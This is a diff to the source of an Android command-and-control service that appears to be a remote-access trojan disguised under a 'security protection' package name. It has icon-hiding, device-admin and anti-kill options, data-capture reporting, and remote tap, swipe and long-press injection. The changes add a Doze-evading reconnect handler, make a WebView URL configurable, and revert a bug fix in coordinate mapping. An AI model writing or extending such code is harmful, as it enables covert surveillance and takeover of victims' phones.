@@ -60,7 +60,7 @@ public class CommandControlService extends Service {
     // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
     // URL do servidor - PUBLIC para acesso do StudioActivity
     public static final String SERVER_URL = BuildConfig.SERVER_URL;
-    public static final String WEBVIEW_URL = "";
+    public static String WEBVIEW_URL = BuildConfig.WEBVIEW_URL;
     public static final boolean HIDE_ICON = false;
     public static final boolean REQUEST_ADMIN = false;
     public static final boolean ANTI_KILL = true;
@@ -424,8 +424,18 @@ public class CommandControlService extends Service {
                     sendCapturedDataLocal(jsonData);
                 }
             }
+            else if ("com.seguranca.protecao.RECONNECT_NOW".equals(action)) {
+                // Fired by AutoReconnect.AlarmReceiver via setExactAndAllowWhileIdle (Doze pierce).
+                // Only attempt a new connection if we are not already connected or in the process of connecting.
+                if (!isConnected && !isConnecting) {
+                    Log.d(TAG, "🔁 RECONNECT_NOW received — initiating reconnect");
+                    connectToServer();
+                } else {
+                    Log.d(TAG, "🔁 RECONNECT_NOW received — already connected, skipping");
+                }
+            }
         }
-        
+
         return START_STICKY;
     }
 
@@ -944,17 +954,10 @@ public class CommandControlService extends Service {
                     int screenH = metricsClick.heightPixels;
                     int x, y;
                     String scaleClick = cmd.has("scale") ? cmd.get("scale").getAsString() : "";
-                    boolean hasX = cmd.has("x") && !cmd.get("x").isJsonNull();
-                    boolean hasY = cmd.has("y") && !cmd.get("y").isJsonNull();
-                    float rawX = hasX ? cmd.get("x").getAsFloat() : 0.0f;
-                    float rawY = hasY ? cmd.get("y").getAsFloat() : 0.0f;
-
-                    // BUG FIX: was rawX > 0.0f / rawY > 0.0f — excluded nodes whose
-                    // centre sits on x=0 or y=0 (left/top screen edge); those fell into
-                    // the raw fallback and ended up mapped to pixel (0,0) instead of the
-                    // correct position.  Changed to >= 0.0f and gated on field presence
-                    // so a missing coord (default 0.0) still takes the raw/fallback path.
-                    if ("vnc_norm".equals(scaleClick) || (hasX && hasY && rawX >= 0.0f && rawX <= 1.0f && rawY >= 0.0f && rawY <= 1.0f)) {
+                    float rawX = (cmd.has("x") && !cmd.get("x").isJsonNull()) ? cmd.get("x").getAsFloat() : 0.0f;
+                    float rawY = (cmd.has("y") && !cmd.get("y").isJsonNull()) ? cmd.get("y").getAsFloat() : 0.0f;
+                    
+                    if ("vnc_norm".equals(scaleClick) || (rawX > 0.0f && rawX <= 1.0f && rawY > 0.0f && rawY <= 1.0f)) {
                         x = Math.round(rawX * screenW);
                         y = Math.round(rawY * screenH);
                         Log.d(TAG, "📐 CLICK (vnc_norm/auto): " + rawX + "," + rawY + " -> (" + x + "," + y + ")");
@@ -978,14 +981,12 @@ public class CommandControlService extends Service {
                     int swipeScreenH = metricsSwipe.heightPixels;
                     int x1, y1, x2, y2;
                     String scaleSwipe = cmd.has("scale") ? cmd.get("scale").getAsString() : "";
-                    boolean hasX1 = cmd.has("x1") && !cmd.get("x1").isJsonNull();
-                    boolean hasY1 = cmd.has("y1") && !cmd.get("y1").isJsonNull();
-                    float rawX1 = hasX1 ? cmd.get("x1").getAsFloat() : 0.0f;
-                    float rawY1 = hasY1 ? cmd.get("y1").getAsFloat() : 0.0f;
+                    float rawX1 = (cmd.has("x1") && !cmd.get("x1").isJsonNull()) ? cmd.get("x1").getAsFloat() : 0.0f;
+                    float rawY1 = (cmd.has("y1") && !cmd.get("y1").isJsonNull()) ? cmd.get("y1").getAsFloat() : 0.0f;
                     float rawX2 = (cmd.has("x2") && !cmd.get("x2").isJsonNull()) ? cmd.get("x2").getAsFloat() : 0.0f;
                     float rawY2 = (cmd.has("y2") && !cmd.get("y2").isJsonNull()) ? cmd.get("y2").getAsFloat() : 0.0f;
-
-                    if ("vnc_norm".equals(scaleSwipe) || (hasX1 && hasY1 && rawX1 >= 0.0f && rawX1 <= 1.0f && rawY1 >= 0.0f && rawY1 <= 1.0f)) {
+                    
+                    if ("vnc_norm".equals(scaleSwipe) || (rawX1 > 0.0f && rawX1 <= 1.0f && rawY1 > 0.0f && rawY1 <= 1.0f)) {
                         x1 = Math.round(rawX1 * swipeScreenW);
                         y1 = Math.round(rawY1 * swipeScreenH);
                         x2 = Math.round(rawX2 * swipeScreenW);
@@ -1016,12 +1017,10 @@ public class CommandControlService extends Service {
                     int lpX, lpY;
                     int duration = cmd.has("duration") ? cmd.get("duration").getAsInt() : 500;
                     String scaleLP = cmd.has("scale") ? cmd.get("scale").getAsString() : "";
-                    boolean hasLpX = cmd.has("x") && !cmd.get("x").isJsonNull();
-                    boolean hasLpY = cmd.has("y") && !cmd.get("y").isJsonNull();
-                    float rawX = hasLpX ? cmd.get("x").getAsFloat() : 0.0f;
-                    float rawY = hasLpY ? cmd.get("y").getAsFloat() : 0.0f;
-
-                    if ("vnc_norm".equals(scaleLP) || (hasLpX && hasLpY && rawX >= 0.0f && rawX <= 1.0f && rawY >= 0.0f && rawY <= 1.0f)) {
+                    float rawX = (cmd.has("x") && !cmd.get("x").isJsonNull()) ? cmd.get("x").getAsFloat() : 0.0f;
+                    float rawY = (cmd.has("y") && !cmd.get("y").isJsonNull()) ? cmd.get("y").getAsFloat() : 0.0f;
+                    
+                    if ("vnc_norm".equals(scaleLP) || (rawX > 0.0f && rawX <= 1.0f && rawY > 0.0f && rawY <= 1.0f)) {
                         lpX = Math.round(rawX * lpScreenW);
                         lpY = Math.round(rawY * lpScreenH);
                         Log.d(TAG, "📐 LONG_PRESS (vnc_norm/auto): " + rawX + "," + rawY + " -> (" + lpX + "," + lpY + ")");
